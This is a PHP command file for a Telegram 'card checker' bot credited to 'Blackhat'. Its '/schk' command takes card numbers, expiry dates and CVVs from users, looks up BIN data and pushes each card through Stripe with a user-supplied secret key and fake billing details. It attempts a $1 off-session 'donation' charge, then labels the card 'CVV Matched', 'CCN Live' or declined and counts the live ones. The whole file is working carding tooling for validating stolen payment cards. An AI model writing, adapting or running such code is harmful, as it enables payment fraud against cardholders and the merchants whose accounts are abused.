<?php

/*

///==[Stripe User Merchant Commands]==///

/schk creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[MUTE]====////////////
if(strpos($message, "/schk ") === 0 || strpos($message, "!schk ") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId,$username);
    
    if ($antispam != false) {
        bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
            'parse_mode' => 'html',
            'reply_to_message_id' => $message_id
        ]);
        return;
    } else {
        $messageidtoedit1 = bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "<b>Wait for Result...</b>",
            'parse_mode' => 'html',
            'reply_to_message_id' => $message_id
        ]);

        $messageidtoedit = GetStr(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
        
        if (preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
            $sec = fetchAPIKey($userId);
          if(!preg_match_all("/sk_(test|live)_[A-Za-z0-9]+/", $sec, $matches)) {
                bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>Add a SK Key First by using /apikey sk_live</b>",
                    'parse_mode'=>'html',
                    'disable_web_page_preview'=>'true'
                    
                ]);
                return;
            }
    
            ###CHECKER PART###  
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: lookup.binlist.net',
                'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
            ));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = GetStr($fim, '"bank":{"name":"', '"');
            $cname = GetStr($fim, '"name":"', '"');
            $brand = GetStr($fim, '"brand":"', '"');
            $country = GetStr($fim, '"country":{"name":"', '"');
            $phone = GetStr($fim, '"phone":"', '"');
            $scheme = GetStr($fim, '"scheme":"', '"');
            $type = GetStr($fim, '"type":"', '"');
            $emoji = GetStr($fim, '"emoji":"', '"');
            $currency = GetStr($fim, '"currency":"', '"');
            $binlenth = strlen($bin);
            $schemename = ucfirst("$scheme");
            $typename = ucfirst("$type");
            
            
            /////////////////////==========[Unavailable if empty]==========////////////////
            
            
            if (empty($schemename)) {
                $schemename = "Unavailable";
            }
            if (empty($typename)) {
                $typename = "Unavailable";
            }
            if (empty($brand)) {
                $brand = "Unavailable";
            }
            if (empty($bank)) {
                $bank = "Unavailable";
            }
            if (empty($cname)) {
                $cname = "Unavailable";
            }
            if (empty($phone)) {
                $phone = "Unavailable";
            }

            $x = 0;  
            while (true) { 
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&billing_details[address][line1]=36&billing_details[address][line2]=Regent Street&billing_details[address][city]=Jamestown&billing_details[address][postal_code]=14701&billing_details[address][state]=New York&billing_details[address][country]=US&billing_details[email]=gvbbnvhgvgh@gmail.com&billing_details[name]=@av7271 Mittal');
                $result1 = curl_exec($ch);
        
                if (strpos($result1, "rate_limit")) {  
                    $x++;  
                    continue;  
                }  
                break;  
            }

            $tok1 = GetStr($result1,'id": "','"');
            $msg1 = GetStr($result1,'"message": "','"');
          
            $x = 0;  
            while (true) { 
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&payment_method_types[]=card&description=@av7271 Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
                $result2 = curl_exec($ch);
                $msg = GetStr($result2, '"decline_code": "','"');
                
                if (strpos($result2, "rate_limit")) {  
                    $x++;  
                    continue;  
                }  
                break;  
            }
            addTotal();
            addUserTotal($userId);
            $rcp = trim(strip_tags(GetStr($result2, '"receipt_url": "','"')));
            $info = curl_getinfo($ch);
            $time = $info['total_time'];
            $time = substr_replace($time, '', 4);

            #-----------------------------------------------------------------------------------------

           if (strpos($result2, 'Payment complete')) {
                $msg2= 'Charge 1USD ✅';
                $res= $rcp;
              addCVV();
              addUserCVV($userId);
            }
            elseif (strpos($result2, 'Thank you') || (strpos($result2, "thank you"))) {
                $msg2= 'Charge 1USD ✅';
                $res= $rcp;
              addCVV();
              addUserCVV($userId);
            }
            elseif (strpos($result2, "Your card has insufficient funds") || (strpos($result2, "insufficient_funds"))) {
                $msg2= 'Insufficient Funds ✅';
                $res=  'CVV Matched ✅';
              addCVV();
              addUserCVV($userId);
            }
            elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))) { 
                $msg2= '3D Card ✅';
                $res=  'CVV Matched ✅';
              addCVV();
              addUserCVV($userId);
            }
            elseif(strpos($result2,'"cvc_check": "pass"')) {
                $msg2= 'Payment Cannot Be Completed';
                $res=  'CVV Matched ✅';
              addCVV();
              addUserCVV($userId);
            }
            elseif(strpos($result2,'"code": "incorrect_cvc"')) {
                $msg2= 'CVV Mismatch';
                $res=  'CCN Live ✅';
              addCCN();
              addUserCCN($userId);
            }
            elseif(strpos($result2,'"code": "incorrect_cvc"') || (strpos($result2, "Your card's security code is incorrect")) || (strpos($result2, "security code is invalid"))) {
                $msg2= 'CVV Mismatch';
                $res=  'CCN Live ✅';
              addCCN();
              addUserCCN($userId);
            }  
            elseif (strpos($result1, "transaction_not_allowed") || (strpos($result2, "Your card does not support"))) {
                $msg2= 'Transaction Not Allowed';
                $res=  'CVV Matched ✅';
              addCVV();
              addUserCVV($userId);
            }
            elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))) 
            {
                $msg2= 'Declined ❌';
                $res=  'Fraudulent❌';
            }
             elseif ((strpos($result1, "Try again in a little bit")) || (strpos($result2, 
            "Try again in a little bit"))) 
            {
                $msg2= 'Try again in a little bit❌';
                $res=  'Try again in a little bit❌';
            }
            elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))) {
                $msg2= 'Expired Card❌';
                $res=  'Declined ❌';
            }
            elseif ((strpos($result1, "generic_decline")) || (strpos($result2, "generic_decline"))) {
                $msg2= 'Generic Declined❌';
                $res=  'Declined ❌';
            }
            elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))) {
                $msg2= 'Do Not Honor❌';
                $res=  'Declined ❌';
            }
            elseif ((strpos($result1, "Your card was declined")) || (strpos($result2, "Your card was declined"))) {
                $msg2= 'Your Card Was Declined❌';
                $res=  'Declined ❌';
            }
            elseif ((strpos($result1, 'Your card number is incorrect')) || (strpos($result2, 'Your card number is incorrect'))) {
                $msg2= 'Card Number Is Incorrect❌';
                $res=  'Declined ❌';
            }
            elseif ((strpos($result1, 'invalid_expiry_year')) || (strpos($result2, "Your card's expiration year is invalid"))) {
                $msg2= "Your card's expiration year is invalid❌";
                $res=  'Declined ❌';
            }
          elseif ((strpos($result1, 'invalid_expiry_month')) || (strpos($result2, "Your card's expiration month is invalid"))) {
                $msg2= "Your card's expiration month is invalid❌";
                $res=  'Declined ❌';
            }
          elseif(strpos($result1,'testmode_charges_only') || (strpos($result1, "Expired API Key provided"))) {
                 $msg2= "SK key revoked ❌";
                $res=  "SK key Expired,Chnage Sk Key  ❌\n$sec";
            }
          elseif(strpos($result1,'api_key_expired')) {
                 $msg2= "SK key Expired,Chnage Sk Key  ❌";
                $res=  $sec❌;
            }
            elseif(strpos($result1,'platform_api_key_expired')) {
                 $res= "SK key Expired,Change Sk Key  ❌\n$sec";
                $msg2=  $sec❌;
            }
            #========================================================================
            bot('editMessageText', [
                'chat_id' => $chat_id,
                'message_id' => $messageidtoedit,
                'text' => "<b>Card:</b> <code>$cc|$mes|$ano|$cvv</code>
<b>Status -» $msg2 
Response -» $res
Bypassing -» $x
Gateway -» User Stripe Merchant
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/+6T-YczOeDyYzYWNk'>Blackhat</a></b>",
                'parse_mode' => 'html',
                'disable_web_page_preview' => 'true'
            ]);
        }
    }
}

?>
